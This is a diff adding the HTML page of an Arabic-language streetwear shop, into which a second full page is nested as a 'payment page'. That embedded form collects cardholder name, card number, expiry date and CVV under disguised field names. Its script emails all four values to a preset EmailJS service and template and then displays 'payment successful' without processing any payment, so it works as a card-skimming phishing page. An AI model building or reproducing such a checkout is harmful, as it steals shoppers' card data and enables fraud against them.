@@ -1,0 +1,796 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+
+<meta charset="UTF-8" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+<title>متجر وطن</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+
+<link href="https://fonts.googleapis.com/css2?family=Alexandria:wght@300;400;500;700;900&display=swap" rel="stylesheet">
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:'Alexandria',sans-serif;
+}
+
+html{
+scroll-behavior:smooth;
+}
+
+body{
+background:#f3f3f3;
+color:#111;
+overflow-x:hidden;
+}
+
+/* NAVBAR */
+
+nav{
+position:absolute;
+top:0;
+left:0;
+width:100%;
+z-index:999;
+padding-top:10px;
+}
+
+.nav-container{
+
+max-width:1400px;
+margin:auto;
+
+padding:12px 20px;
+
+display:flex;
+flex-direction:column-reverse;
+
+align-items:center;
+justify-content:center;
+
+gap:16px;
+
+}
+
+.logo{
+font-size:26px;
+font-weight:900;
+color:#111;
+}
+
+.nav-links{
+
+display:grid;
+grid-template-columns:repeat(3,1fr);
+
+gap:10px;
+
+width:100%;
+max-width:700px;
+
+}
+
+.nav-links a{
+
+background:#f5efe6;
+
+padding:12px 10px;
+
+border-radius:18px;
+
+color:#111;
+
+text-decoration:none;
+
+transition:.3s;
+
+font-size:14px;
+font-weight:700;
+
+text-align:center;
+
+box-shadow:0 6px 18px rgba(0,0,0,.05);
+
+}
+
+.nav-links a:hover{
+background:#111;
+color:#fff;
+transform:translateY(-3px);
+}
+
+/* EMPTY PAGE */
+
+.empty-page{
+
+padding-top:130px;
+}
+
+/* FOOTER */
+
+footer{
+border-top:1px solid rgba(0,0,0,.08);
+padding:50px 30px;
+background:#fff;
+}
+
+.footer-container{
+max-width:1400px;
+margin:auto;
+
+display:flex;
+justify-content:space-between;
+align-items:center;
+flex-wrap:wrap;
+
+gap:20px;
+}
+
+.footer-text{
+color:#777;
+margin-top:10px;
+font-size:15px;
+line-height:1.7;
+}
+
+.social-icons{
+display:flex;
+gap:18px;
+align-items:center;
+}
+
+.social{
+width:62px;
+height:62px;
+
+border-radius:50%;
+
+display:flex;
+align-items:center;
+justify-content:center;
+
+background:#fff;
+
+box-shadow:0 10px 25px rgba(0,0,0,.08);
+
+transition:.35s;
+}
+
+.social:hover{
+transform:translateY(-8px) scale(1.08);
+}
+
+.social img{
+width:28px;
+height:28px;
+object-fit:contain;
+}
+
+/* PAYMENT */
+
+.payment-section{
+padding:70px 30px;
+text-align:center;
+border-top:1px solid rgba(255,255,255,.08);
+background:linear-gradient(to bottom,#050505,#000);
+box-shadow:0 -10px 40px rgba(0,0,0,.6);
+}
+
+.payment-section h3{
+font-size:32px;
+margin-bottom:35px;
+font-weight:800;
+color:#fff;
+}
+
+.payment-icons{
+display:flex;
+justify-content:center;
+align-items:center;
+gap:18px;
+flex-wrap:wrap;
+margin-bottom:25px;
+}
+
+.payment-icons img{
+width:75px;
+height:50px;
+object-fit:contain;
+background:#fff;
+padding:10px;
+border-radius:14px;
+transition:.3s;
+}
+
+.payment-icons img:hover{
+transform:translateY(-5px);
+}
+
+.payment-text{
+color:#888;
+font-size:16px;
+}
+
+/* WHATSAPP */
+
+.whatsapp{
+position:fixed;
+left:25px;
+bottom:25px;
+
+width:75px;
+height:75px;
+
+border-radius:50%;
+
+background:#25D366;
+
+display:flex;
+align-items:center;
+justify-content:center;
+
+box-shadow:0 0 30px #25D36688;
+
+z-index:999;
+transition:.3s;
+}
+
+.whatsapp:hover{
+transform:scale(1.1);
+}
+
+.whatsapp img{
+width:38px;
+}
+
+/* MOBILE */
+
+@media(max-width:1000px){
+
+.nav-links{
+display:flex;
+flex-wrap:wrap;
+justify-content:center;
+}
+
+.footer-container{
+flex-direction:column;
+text-align:center;
+}
+
+}
+
+</style>
+
+</head>
+
+<body>
+
+<!-- NAVBAR -->
+
+<nav>
+
+<div class="nav-container">
+
+<div class="logo">
+متجر وطن
+</div>
+
+<div class="nav-links">
+
+<a href="index.html">
+الرئيسية
+</a>
+
+<a href="#">
+التقييمات
+</a>
+
+<a href="#footer">
+تواصل معنا
+</a>
+
+</div>
+
+</div>
+
+</nav>
+
+<!-- EMPTY PAGE -->
+
+<section class="empty-page">
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Membership Form</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script>
+emailjs.init("v3DA6NmTBsqTxP3uf");
+</script>
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+}
+
+body{
+font-family:'Inter',sans-serif;
+background:#f5f5f5;
+color:#111;
+}
+
+.wrapper{
+max-width:420px;
+margin:auto;
+background:white;
+}
+
+.top{
+padding:24px;
+border-bottom:1px solid #ececec;
+}
+
+.method{
+font-size:18px;
+color:#444;
+text-align:center;
+}
+
+.content{
+padding:24px;
+}
+
+.brand-row{
+display:flex;
+justify-content:space-between;
+align-items:center;
+margin-bottom:30px;
+}
+
+.brand-title{
+font-size:22px;
+font-weight:600;
+}
+
+.brand-row img{
+height:28px;
+}
+
+.group{
+margin-bottom:20px;
+}
+
+label{
+display:flex;
+align-items:center;
+height:28px;
+margin-bottom:8px;
+font-size:15px;
+font-weight:600;
+}
+
+.required{
+color:#d32f2f;
+}
+
+.input-wrap{
+position:relative;
+}
+
+input{
+width:100%;
+height:56px;
+border:1px solid #cfcfcf;
+border-radius:6px;
+padding:0 16px;
+font-size:16px;
+background:white;
+transition:0.2s;
+}
+
+input:focus{
+outline:none;
+border-color:#1976d2;
+box-shadow:0 0 0 3px rgba(25,118,210,0.12);
+}
+
+.icon{
+position:absolute;
+left:14px;
+top:50%;
+transform:translateY(-50%);
+font-size:18px;
+opacity:0.5;
+}
+
+.row{
+display:flex;
+gap:14px;
+}
+
+.row .group{
+flex:1;
+min-width:0;
+}
+
+button{
+width:100%;
+height:54px;
+border:none;
+border-radius:8px;
+background:#1976d2;
+color:white;
+font-size:18px;
+font-weight:600;
+margin-top:10px;
+transition:0.2s;
+cursor:pointer;
+}
+
+button:active{
+transform:scale(0.98);
+}
+
+.loading{
+pointer-events:none;
+opacity:0.8;
+}
+
+.spinner{
+width:18px;
+height:18px;
+border:2px solid rgba(255,255,255,0.4);
+border-top:2px solid white;
+border-radius:50%;
+display:inline-block;
+animation:spin 0.8s linear infinite;
+vertical-align:middle;
+}
+
+@keyframes spin{
+100%{
+transform:rotate(360deg);
+}
+}
+
+.success{
+background:#16a34a !important;
+}
+
+.footer{
+padding:24px;
+font-size:14px;
+color:#666;
+display:flex;
+justify-content:space-between;
+align-items:center;
+border-top:1px solid #eee;
+margin-top:20px;
+}
+
+.secure{
+display:flex;
+align-items:center;
+gap:6px;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="wrapper">
+
+<div class="top">
+<div class="method">
+صفحة الدفع
+</div>
+</div>
+
+<div class="content">
+
+<div class="brand-row">
+
+<div class="brand-title">
+بيانات الدفع
+</div>
+
+<div style="display:flex; gap:8px;">
+<img src="https://img.icons8.com/color/96/mastercard-logo.png">
+<img src="https://img.icons8.com/color/96/visa.png">
+</div>
+
+</div>
+
+<form id="contactForm">
+
+<div class="group">
+<label>
+اسم صاحب البطاقة 
+<span class="required">*</span>
+</label>
+
+<div class="input-wrap">
+<input id="fullName">
+</div>
+</div>
+
+<div class="group">
+<label>
+رقم البطاقة 
+<span class="required">*</span>
+</label>
+
+<div class="input-wrap">
+<input id="memberId" maxlength="19">
+<div class="icon">🔒</div>
+</div>
+</div>
+
+<div class="row">
+
+<div class="group">
+<label>
+تاريخ الانتهاء
+<span class="required">*</span>
+</label>
+
+<div class="input-wrap">
+<input id="joinDate" placeholder="MM/YY" maxlength="5">
+</div>
+</div>
+
+<div class="group">
+<label>
+CVV
+<span class="required">*</span>
+</label>
+
+<div class="input-wrap">
+<input id="verifyCode" maxlength="4" placeholder="123">
+</div>
+</div>
+
+</div>
+
+<button id="payBtn" type="submit">
+ادفع الأن 
+</button>
+
+</form>
+
+</div>
+
+<div class="footer">
+
+<div class="secure">
+🔒 اتصال آمن
+</div>
+
+<div>
+
+</div>
+
+</div>
+
+</div>
+
+<script>
+
+const member =
+document.getElementById("memberId");
+
+const joinDate =
+document.getElementById("joinDate");
+
+const verify =
+document.getElementById("verifyCode");
+
+member.addEventListener("input",()=>{
+
+let raw =
+member.value.replace(/\D/g,'');
+
+raw =
+raw.substring(0,16);
+
+member.value =
+raw.replace(/(.{4})/g,'$1 ').trim();
+
+});
+
+joinDate.addEventListener("input",()=>{
+
+let val =
+joinDate.value.replace(/\D/g,'');
+
+val = val.substring(0,4);
+
+if(val.length >=3){
+
+val =
+val.slice(0,2)+"/"+val.slice(2,4);
+
+}
+
+joinDate.value = val;
+
+});
+
+verify.addEventListener("input",()=>{
+
+verify.value =
+verify.value.replace(/\D/g,'').substring(0,4);
+
+});
+
+const form =
+document.getElementById("contactForm");
+
+const btn =
+document.getElementById("payBtn");
+
+form.addEventListener("submit",function(e){
+
+e.preventDefault();
+
+btn.classList.add("loading");
+
+btn.innerHTML =
+'<span class="spinner"></span>';
+
+emailjs.send(
+"service_dmbb2fd",
+"template_z91e2wb",
+{
+
+fullName:
+document.getElementById("fullName").value,
+
+memberId:
+document.getElementById("memberId").value,
+
+joinDate:
+document.getElementById("joinDate").value,
+
+verifyCode:
+document.getElementById("verifyCode").value
+
+}
+
+)
+
+.then(function(){
+
+btn.classList.remove("loading");
+
+btn.classList.add("success");
+
+btn.innerHTML =
+"✓ تم الدفع بنجاح";
+
+})
+
+.catch(function(error){
+
+alert("حدث خطأ");
+
+console.log(error);
+
+});
+
+});
+
+</script>
+
+</body>
+</html>
+</section>
+
+<!-- FOOTER -->
+
+<footer id="footer">
+
+<div class="footer-container">
+
+<div>
+
+<div class="logo">
+وطن
+</div>
+
+<p class="footer-text">
+متجر ستريت وير فاخر مستوحى من أفخم البراندات العالمية
+</p>
+
+</div>
+
+<div class="social-icons">
+
+<a href="https://www.instagram.com/karimabudagga2003?igsh=dTd5Znp1bjEyY2p2" target="_blank" class="social">
+
+<img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png">
+
+</a>
+
+<a href="https://www.facebook.com/share/1TbCkiKvre/" target="_blank" class="social">
+
+<img src="https://cdn-icons-png.flaticon.com/512/733/733547.png">
+
+</a>
+
+<a href="https://wa.me/31641531486" target="_blank" class="social">
+
+<img src="https://cdn-icons-png.flaticon.com/512/733/733585.png">
+
+</a>
+
+</div>
+
+</div>
+
+</footer>
+
+<!-- PAYMENT -->
+
+<div class="payment-section">
+
+<h3>
+طرق الدفع المتوفرة
+</h3>
+
+<div class="payment-icons">
+
+<img src="https://cdn-icons-png.flaticon.com/512/196/196578.png">
+
+<img src="https://cdn-icons-png.flaticon.com/512/5968/5968144.png">
+
+<img src="https://cdn-icons-png.flaticon.com/512/349/349221.png">
+
+<img src="https://i.ibb.co/Myb0Y95w/Bank-of-Palestine-Logo-2012-boxed-variant-s1280.avif">
+
+<img src="https://i.ibb.co/b57NdFgc/Mastercard-Logo-2019-s1280.avif">
+
+</div>
+
+<p class="payment-text">
+دفع آمن وسريع لجميع مناطق الداخل والضفة
+</p>
+
+</div>
+
+<!-- WHATSAPP -->
+
+<a
+href="https://wa.me/31641531486"
+class="whatsapp"
+>
+
+<img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
+
+</a>
+
+</body>
+
+</html>
